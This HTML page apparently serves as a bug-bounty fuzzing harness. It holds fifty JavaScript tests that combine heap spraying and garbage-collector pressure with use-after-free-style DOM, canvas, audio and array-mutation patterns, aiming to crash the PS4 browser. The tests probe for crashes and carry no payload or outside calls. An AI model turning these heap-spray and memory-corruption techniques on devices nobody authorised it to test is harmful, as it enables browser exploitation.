<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Memory Corruption Tests 101-150 with Heap Spray/GC Pressure</title>
</head>
<body>
    <h1>PS4 Memory Corruption Tests 101-150</h1>
    <p>These tests incorporate limited heap spraying or memory allocation to pressure GC, aiming for ethical PoC crashes in the PS4 browser for HackerOne reporting. Allocations are capped to avoid DoS (e.g., no infinite loops, limited sizes to prevent OOM on typical PS4 hardware). Test on your own device only.</p>
    
    <button onclick="test101()">101: Array Holes with Heap Spray</button>
    <button onclick="test102()">102: Object Freeze with GC Pressure</button>
    <button onclick="test103()">103: Function Prototype with Heap Spray</button>
    <button onclick="test104()">104: Constructor Return with GC Pressure</button>
    <button onclick="test105()">105: Array Splice Sort with Heap Spray</button>
    <button onclick="test106()">106: String CharAt with GC Pressure</button>
    <button onclick="test107()">107: RegExp Exec with Heap Spray</button>
    <button onclick="test108()">108: JSON Reviver with GC Pressure</button>
    <button onclick="test109()">109: Object Assign with Heap Spray</button>
    <button onclick="test110()">110: Array Reduce with GC Pressure</button>
    <button onclick="test111()">111: Canvas ContextLost with Heap Spray</button>
    <button onclick="test112()">112: Canvas ToBlob with GC Pressure</button>
    <button onclick="test113()">113: Canvas ImageBitmap with Heap Spray</button>
    <button onclick="test114()">114: Canvas Pattern with GC Pressure</button>
    <button onclick="test115()">115: Canvas Gradient with Heap Spray</button>
    <button onclick="test116()">116: Audio Buffer with GC Pressure</button>
    <button onclick="test117()">117: Audio Source with Heap Spray</button>
    <button onclick="test118()">118: Video Track with GC Pressure</button>
    <button onclick="test119()">119: Media Stream with Heap Spray</button>
    <button onclick="test120()">120: DOM Rect with GC Pressure</button>
    <button onclick="test121()">121: DOM TokenList with Heap Spray</button>
    <button onclick="test122()">122: Style Declaration with GC Pressure</button>
    <button onclick="test123()">123: CSS Rule with Heap Spray</button>
    <button onclick="test124()">124: MediaQueryList with GC Pressure</button>
    <button onclick="test125()">125: FontFace Load with Heap Spray</button>
    <button onclick="test126()">126: Animation Cancel with GC Pressure</button>
    <button onclick="test127()">127: Animation Effect with Heap Spray</button>
    <button onclick="test128()">128: KeyframeEffect with GC Pressure</button>
    <button onclick="test129()">129: Transition End with Heap Spray</button>
    <button onclick="test130()">130: Focus Event with GC Pressure</button>
    <button onclick="test131()">131: Input Validation with Heap Spray</button>
    <button onclick="test132()">132: Form Submit with GC Pressure</button>
    <button onclick="test133()">133: Select Option with Heap Spray</button>
    <button onclick="test134()">134: TextArea Value with GC Pressure</button>
    <button onclick="test135()">135: Radio Group with Heap Spray</button>
    <button onclick="test136()">136: Checkbox State with GC Pressure</button>
    <button onclick="test137()">137: Label Control with Heap Spray</button>
    <button onclick="test138()">138: Fieldset Elements with GC Pressure</button>
    <button onclick="test139()">139: Table Cell with Heap Spray</button>
    <button onclick="test140()">140: Table Row with GC Pressure</button>
    <button onclick="test141()">141: List Item with Heap Spray</button>
    <button onclick="test142()">142: Anchor Hash with GC Pressure</button>
    <button onclick="test143()">143: Image Load with Heap Spray</button>
    <button onclick="test144()">144: Script Async with GC Pressure</button>
    <button onclick="test145()">145: Link Sheet with Heap Spray</button>
    <button onclick="test146()">146: Base Href with GC Pressure</button>
    <button onclick="test147()">147: Meta Content with Heap Spray</button>
    <button onclick="test148()">148: Title Node with GC Pressure</button>
    <button onclick="test149()">149: Template Content with Heap Spray</button>
    <button onclick="test150()">150: Slot Assign with GC Pressure</button>

    <script>
        // Helper function for limited heap spray (capped to avoid DoS)
        function limitedHeapSpray() {
            let sprays = [];
            for (let i = 0; i < 5000; i++) { // Limited to ~20MB total
                sprays.push(new ArrayBuffer(0x1000)); // 4KB each
            }
            return sprays; // Keep reference to prevent immediate GC
        }

        // Helper function to pressure GC via allocations
        function pressureGC() {
            let allocs = [];
            for (let i = 0; i < 10000; i++) { // Limited allocations
                allocs.push(new Uint8Array(1024)); // 1KB each, ~10MB
            }
            allocs = null; // Allow GC
        }

        function test101() {
            limitedHeapSpray();
            const arr = new Array(10);
            arr[0] = 1;
            arr[2] = 3;
            arr[4] = {buffer: new ArrayBuffer(512)};
            arr.sort((a, b) => {
                if (a === undefined) arr[1] = 2;
                return 0;
            });
            const val = arr[4];
        }

        function test102() {
            pressureGC();
            const obj = {a: 1, b: {nested: new ArrayBuffer(512)}};
            Object.freeze(obj);
            Object.defineProperty(obj, 'c', {get: function() {
                obj.b = null;
                return 3;
            }});
            const val = obj.c;
        }

        function test103() {
            limitedHeapSpray();
            function Constructor() { this.data = new ArrayBuffer(512); }
            Constructor.prototype.method = function() { return this.data; };
            const instance = new Constructor();
            const oldProto = Constructor.prototype;
            Constructor.prototype = {method: function() { return null; }};
            const result = instance.method();
        }

        function test104() {
            pressureGC();
            function Trick() { return {spoofed: new ArrayBuffer(1024)}; }
            const instance = new Trick();
            instance.data = new Uint8Array(512);
            const check = instance instanceof Trick;
        }

        function test105() {
            limitedHeapSpray();
            const arr = [1, 2, 3, 4, 5];
            arr.sort((a, b) => {
                arr.splice(1, 2);
                arr.push(new ArrayBuffer(512));
                return a - b;
            });
        }

        function test106() {
            pressureGC();
            let str = 'ABC';
            Object.defineProperty(str, 'length', {get: function() { return 1000; }});
            const char = str.charAt(100);
        }

        function test107() {
            limitedHeapSpray();
            const regex = /a/g;
            const str = 'aaa';
            let result;
            while ((result = regex.exec(str)) !== null) {
                regex.lastIndex = 0;
                if (result.index > 10) break;
            }
        }

        function test108() {
            pressureGC();
            const json = '{"a":1,"b":{"c":2}}';
            JSON.parse(json, function(key, value) {
                if (key === 'b') { this.a = new ArrayBuffer(512); }
                return value;
            });
        }

        function test109() {
            limitedHeapSpray();
            const target = {a: 1};
            const source = {get b() {
                delete target.a;
                target.a = new Uint8Array(100);
                return 2;
            }};
            Object.assign(target, source);
        }

        function test110() {
            pressureGC();
            const arr = [1, 2, 3, 4, 5];
            arr.reduce((acc, val, idx) => {
                if (idx === 2) {
                    arr.length = 0;
                    arr.push(new ArrayBuffer(512));
                }
                return acc + val;
            }, 0);
        }

        function test111() {
            limitedHeapSpray();
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            ctx.fillRect(0, 0, 256, 256);
            const event = new Event('webglcontextlost');
            canvas.dispatchEvent(event);
            setTimeout(() => { ctx.fillRect(0, 0, 256, 256); }, 10);
        }

        function test112() {
            pressureGC();
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            ctx.fillRect(0, 0, 256, 256);
            canvas.toBlob(blob => { canvas.width = 512; });
        }

        function test113() {
            if (!window.createImageBitmap) return;
            limitedHeapSpray();
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            createImageBitmap(canvas).then(bitmap => {
                canvas.width = 512;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0);
            });
        }

        function test114() {
            pressureGC();
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            const patternCanvas = document.createElement('canvas');
            patternCanvas.width = 64;
            patternCanvas.height = 64;
            const pattern = ctx.createPattern(patternCanvas, 'repeat');
            patternCanvas.width = 128;
            ctx.fillStyle = pattern;
            ctx.fillRect(0, 0, 256, 256);
        }

        function test115() {
            limitedHeapSpray();
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            const gradient = ctx.createLinearGradient(0, 0, 256, 256);
            gradient.addColorStop(0, 'red');
            gradient.addColorStop(1, 'blue');
            canvas.width = 512;
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 512, 512);
        }

        function test116() {
            if (!window.AudioContext && !window.webkitAudioContext) return;
            pressureGC();
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            const ctx = new AudioContext();
            const buffer = ctx.createBuffer(2, 1024, ctx.sampleRate);
            const data = buffer.getChannelData(0);
            data[0] = 0.5;
            ctx.close();
            setTimeout(() => { data[0] = 1.0; }, 10);
        }

        function test117() {
            if (!window.AudioContext && !window.webkitAudioContext) return;
            limitedHeapSpray();
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            const ctx = new AudioContext();
            const buffer = ctx.createBuffer(1, 1024, ctx.sampleRate);
            const source = ctx.createBufferSource();
            source.buffer = buffer;
            source.start(0);
            source.stop();
            setTimeout(() => { source.connect(ctx.destination); }, 10);
        }

        function test118() {
            pressureGC();
            const video = document.createElement('video');
            document.body.appendChild(video);
            const track = video.addTextTrack('subtitles', 'English', 'en');
            document.body.removeChild(video);
            setTimeout(() => { track.mode = 'showing'; }, 10);
        }

        function test119() {
            if (!navigator.mediaDevices) return;
            limitedHeapSpray();
            navigator.mediaDevices.getUserMedia({audio: true, video: false})
                .then(stream => {
                    const track = stream.getTracks()[0];
                    stream.removeTrack(track);
                    setTimeout(() => { track.stop(); }, 10);
                })
                .catch(e => {});
        }

        function test120() {
            pressureGC();
            const elem = document.createElement('div');
            elem.style.width = '100px';
            elem.style.height = '100px';
            document.body.appendChild(elem);
            const rect = elem.getBoundingClientRect();
            document.body.removeChild(elem);
            setTimeout(() => { const x = rect.x; const y = rect.y; }, 10);
        }

        function test121() {
            limitedHeapSpray();
            const elem = document.createElement('div');
            elem.className = 'a b c';
            document.body.appendChild(elem);
            const classList = elem.classList;
            document.body.removeChild(elem);
            setTimeout(() => { classList.add('d'); classList.remove('a'); }, 10);
        }

        function test122() {
            pressureGC();
            const elem = document.createElement('div');
            elem.style.cssText = 'width: 100px; height: 100px;';
            document.body.appendChild(elem);
            const style = elem.style;
            document.body.removeChild(elem);
            setTimeout(() => { style.width = '200px'; }, 10);
        }

        function test123() {
            limitedHeapSpray();
            const style = document.createElement('style');
            document.head.appendChild(style);
            style.sheet.insertRule('.a { color: red; }', 0);
            style.sheet.insertRule('.b { color: blue; }', 1);
            const rules = style.sheet.cssRules;
            style.sheet.deleteRule(0);
            setTimeout(() => { const rule = rules[1]; if (rule) rule.style.color = 'green'; }, 10);
        }

        function test124() {
            if (!window.matchMedia) return;
            pressureGC();
            const mql = matchMedia('(min-width: 600px)');
            const iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            const iframeMql = iframe.contentWindow.matchMedia('(min-width: 600px)');
            document.body.removeChild(iframe);
            setTimeout(() => { const matches = iframeMql.matches; }, 10);
        }

        function test125() {
            if (!window.FontFace) return;
            limitedHeapSpray();
            const font = new FontFace('TestFont', 'url(data:font/woff2;base64,d09GMgABAAAAAA)');
            font.load().then(loadedFont => {
                document.fonts.delete(loadedFont);
                setTimeout(() => { const status = loadedFont.status; }, 10);
            }).catch(e => {});
        }

        function test126() {
            pressureGC();
            const elem = document.createElement('div');
            elem.style.width = '100px';
            document.body.appendChild(elem);
            const animation = elem.animate([{width: '100px'}, {width: '200px'}], 1000);
            animation.cancel();
            setTimeout(() => { animation.play(); }, 10);
        }

        function test127() {
            limitedHeapSpray();
            const elem = document.createElement('div');
            document.body.appendChild(elem);
            const animation = elem.animate([{opacity: 0}, {opacity: 1}], {duration: 1000});
            const effect = animation.effect;
            document.body.removeChild(elem);
            setTimeout(() => { effect.updateTiming({duration: 2000}); }, 10);
        }

        function test128() {
            pressureGC();
            const elem = document.createElement('div');
            document.body.appendChild(elem);
            const keyframes = new KeyframeEffect(elem, [{transform: 'scale(1)'}, {transform: 'scale(2)'}], 1000);
            document.body.removeChild(elem);
            setTimeout(() => { const target = keyframes.target; }, 10);
        }

        function test129() {
            limitedHeapSpray();
            const elem = document.createElement('div');
            elem.style.transition = 'width 1s';
            elem.style.width = '100px';
            document.body.appendChild(elem);
            let event = null;
            elem.addEventListener('transitionend', e => {
                event = e;
                document.body.removeChild(elem);
            });
            elem.style.width = '200px';
            setTimeout(() => { if (event) { const target = event.target; } }, 1100);
        }

        function test130() {
            pressureGC();
            const input1 = document.createElement('input');
            const input2 = document.createElement('input');
            document.body.appendChild(input1);
            document.body.appendChild(input2);
            input1.addEventListener('focus', () => {
                document.body.removeChild(input2);
                input2.focus();
            });
            input1.focus();
        }

        function test131() {
            limitedHeapSpray();
            const form = document.createElement('form');
            const input = document.createElement('input');
            input.required = true;
            form.appendChild(input);
            document.body.appendChild(form);
            form.addEventListener('invalid', e => { document.body.removeChild(form); }, true);
            form.reportValidity();
        }

        function test132() {
            pressureGC();
            const form = document.createElement('form');
            const input = document.createElement('input');
            input.name = 'test';
            input.value = 'data';
            form.appendChild(input);
            document.body.appendChild(form);
            form.addEventListener('submit', e => {
                e.preventDefault();
                document.body.removeChild(form);
            });
            form.submit();
        }

        function test133() {
            limitedHeapSpray();
            const select = document.createElement('select');
            const option1 = document.createElement('option');
            option1.value = '1';
            const option2 = document.createElement('option');
            option2.value = '2';
            select.appendChild(option1);
            select.appendChild(option2);
            document.body.appendChild(select);
            const options = select.options;
            select.removeChild(option1);
            setTimeout(() => { const opt = options[0]; if (opt) opt.selected = true; }, 10);
        }

        function test134() {
            pressureGC();
            const textarea = document.createElement('textarea');
            textarea.value = 'Initial';
            document.body.appendChild(textarea);
            let value = textarea.value;
            document.body.removeChild(textarea);
            setTimeout(() => { textarea.value = 'Modified'; value = textarea.value; }, 10);
        }

        function test135() {
            limitedHeapSpray();
            const form = document.createElement('form');
            const radio1 = document.createElement('input');
            radio1.type = 'radio';
            radio1.name = 'group';
            const radio2 = document.createElement('input');
            radio2.type = 'radio';
            radio2.name = 'group';
            form.appendChild(radio1);
            form.appendChild(radio2);
            document.body.appendChild(form);
            radio1.checked = true;
            document.body.removeChild(form);
            setTimeout(() => { radio2.checked = true; }, 10);
        }

        function test136() {
            pressureGC();
            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            document.body.appendChild(checkbox);
            checkbox.checked = true;
            document.body.removeChild(checkbox);
            setTimeout(() => { checkbox.checked = false; const state = checkbox.checked; }, 10);
        }

        function test137() {
            limitedHeapSpray();
            const label = document.createElement('label');
            const input = document.createElement('input');
            label.appendChild(input);
            document.body.appendChild(label);
            const control = label.control;
            document.body.removeChild(label);
            setTimeout(() => { if (control) control.focus(); }, 10);
        }

        function test138() {
            pressureGC();
            const fieldset = document.createElement('fieldset');
            const input = document.createElement('input');
            fieldset.appendChild(input);
            document.body.appendChild(fieldset);
            const elements = fieldset.elements;
            document.body.removeChild(fieldset);
            setTimeout(() => { const elem = elements[0]; if (elem) elem.value = 'test'; }, 10);
        }

        function test139() {
            limitedHeapSpray();
            const table = document.createElement('table');
            const row = table.insertRow();
            const cell = row.insertCell();
            cell.textContent = 'Data';
            document.body.appendChild(table);
            document.body.removeChild(table);
            setTimeout(() => { cell.textContent = 'Modified'; }, 10);
        }

        function test140() {
            pressureGC();
            const table = document.createElement('table');
            const tbody = table.createTBody();
            const row1 = tbody.insertRow();
            const row2 = tbody.insertRow();
            document.body.appendChild(table);
            const rows = tbody.rows;
            tbody.deleteRow(0);
            setTimeout(() => { const row = rows[0]; if (row) row.insertCell(); }, 10);
        }

        function test141() {
            limitedHeapSpray();
            const ul = document.createElement('ul');
            const li = document.createElement('li');
            li.textContent = 'Item';
            ul.appendChild(li);
            document.body.appendChild(ul);
            ul.removeChild(li);
            setTimeout(() => { li.textContent = 'Modified'; }, 10);
        }

        function test142() {
            pressureGC();
            const anchor = document.createElement('a');
            anchor.href = '#section1';
            document.body.appendChild(anchor);
            anchor.addEventListener('click', e => {
                e.preventDefault();
                document.body.removeChild(anchor);
                location.hash = '#section2';
            });
            anchor.click();
        }

        function test143() {
            limitedHeapSpray();
            const img = new Image();
            img.onload = function() {
                const parent = img.parentNode;
                if (parent) parent.removeChild(img);
            };
            document.body.appendChild(img);
            img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
        }

        function test144() {
            pressureGC();
            const script = document.createElement('script');
            script.async = true;
            script.textContent = 'console.log("test")';
            document.head.appendChild(script);
            setTimeout(() => { document.head.removeChild(script); }, 5);
        }

        function test145() {
            limitedHeapSpray();
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'data:text/css,body{color:red;}';
            document.head.appendChild(link);
            setTimeout(() => {
                link.disabled = true;
                link.disabled = false;
                document.head.removeChild(link);
            }, 10);
        }

        function test146() {
            pressureGC();
            const base = document.createElement('base');
            base.href = 'http://example.com/';
            document.head.appendChild(base);
            const anchor = document.createElement('a');
            anchor.href = 'page.html';
            const href1 = anchor.href;
            base.href = 'http://other.com/';
            const href2 = anchor.href;
        }

        function test147() {
            limitedHeapSpray();
            const meta = document.createElement('meta');
            meta.name = 'viewport';
            meta.content = 'width=device-width';
            document.head.appendChild(meta);
            meta.content = 'width=1024';
            document.head.removeChild(meta);
            setTimeout(() => { meta.content = 'width=512'; }, 10);
        }

        function test148() {
            pressureGC();
            const title = document.createElement('title');
            title.textContent = 'Test';
            document.head.appendChild(title);
            const textNode = title.firstChild;
            document.head.removeChild(title);
            setTimeout(() => { if (textNode) textNode.textContent = 'Modified'; }, 10);
        }

        function test149() {
            limitedHeapSpray();
            const template = document.createElement('template');
            template.innerHTML = '<div>Content</div>';
            document.body.appendChild(template);
            const content = template.content;
            const div = content.firstChild;
            document.body.removeChild(template);
            setTimeout(() => { if (div) div.textContent = 'Modified'; }, 10);
        }

        function test150() {
            if (!document.body.attachShadow) return;
            pressureGC();
            const host = document.createElement('div');
            document.body.appendChild(host);
            const shadow = host.attachShadow({mode: 'open'});
            const slot = document.createElement('slot');
            shadow.appendChild(slot);
            const content = document.createElement('span');
            content.textContent = 'Slotted';
            host.appendChild(content);
            document.body.removeChild(host);
            setTimeout(() => { content.textContent = 'Modified'; }, 10);
        }
    </script>
</body>
</html>
